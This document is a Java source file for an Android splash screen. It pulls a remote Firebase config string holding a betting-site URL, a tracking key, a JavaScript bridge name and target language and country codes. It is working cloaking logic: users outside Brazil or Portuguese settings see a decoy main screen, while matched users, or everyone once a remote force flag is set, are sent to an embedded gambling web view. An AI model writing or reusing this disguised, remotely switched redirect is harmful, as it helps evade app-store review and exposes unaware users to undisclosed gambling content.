package com.iizuhn.rrlxqrs;

import android.content.Intent;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;

import androidx.appcompat.app.AppCompatActivity;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;

import java.util.Locale;

public class SplashActivity extends AppCompatActivity {

    private static final String TAG = "rrlxqrs";
    public static String url = "";
    public static String appsflyerkey = "";
    public static String jsobjectname = "";
    public static String force2B = "";
    public static String mlanguage = "";
    public static String mcountryiso = "";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_splash);

        FirebaseRemoteConfig mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
        FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                .setMinimumFetchIntervalInSeconds(3600 * 24 * 10)//本地数据保存至少30天，可以自动定义>30即可
                .build();
        mFirebaseRemoteConfig.setConfigSettingsAsync(configSettings);

        //正式版本，用firebase返回参数
        mFirebaseRemoteConfig.fetchAndActivate()
                .addOnCompleteListener(this, new OnCompleteListener<Boolean>() {
                    @Override
                    public void onComplete(Task<Boolean> task) {
                        try {
                            //包名appid最后一个单词
                            //包名appid最后一个单词
                            //包名appid最后一个单词
                            String[] appIdArrays = BuildConfig.APPLICATION_ID.split("\\.");
                            String firebaseKey = appIdArrays[appIdArrays.length - 1];
                            String datas = mFirebaseRemoteConfig.getString(firebaseKey);
                            Log.d(TAG, "datas=" + datas);

                            if (datas.isEmpty()) {
                                startActivity(new Intent(SplashActivity.this, MainActivity.class));
                                finish();
                            } else {
                                //https://cpf16.bet+d7Nt5mS4pjfj9gncXMkXZ6+jsBridge+1+pt+br
                                url = datas.split("\\+")[0];//"https://rspg.bet"
                                appsflyerkey = datas.split("\\+")[1];
                                jsobjectname = datas.split("\\+")[2];
                                force2B = datas.split("\\+")[3];
                                mlanguage = datas.split("\\+")[4];
                                mcountryiso = datas.split("\\+")[5];
                                Log.d(TAG, "url=" + url);
                                Log.d(TAG, "afkey=" + appsflyerkey);
                                Log.d(TAG, "jsobjectname=" + jsobjectname);
                                Log.d(TAG, "force2B=" + force2B);
                                Log.d(TAG, "mlanguage=" + mlanguage);
                                Log.d(TAG, "mcountryiso=" + mcountryiso);
                                jumpPage();
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                            startActivity(new Intent(SplashActivity.this, MainActivity.class));
                            finish();
                        }

                    }
                });

    }

    private void jumpPage() {
        TelephonyManager tm = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
        String countryIso = tm.getNetworkCountryIso();//br、cn
        Locale locale = getResources().getConfiguration().locale;
        String language = locale.getLanguage();//pt、zh、en
        AppsFlyerLibUtil.initAppsFlyer(appsflyerkey, this);
//        Toast.makeText(this, "countryIso:" + countryIso +
//                ",language:" + language, Toast.LENGTH_LONG).show();
        if (mlanguage.contains(language) && mcountryiso.contains(countryIso)) {
            startActivity(new Intent(SplashActivity.this, BWebMainActivity.class));
        } else if (TextUtils.equals(force2B, "1")) {
            startActivity(new Intent(SplashActivity.this, BWebMainActivity.class));
        } else {
            startActivity(new Intent(SplashActivity.this, MainActivity.class));
        }
        finish();
    }
}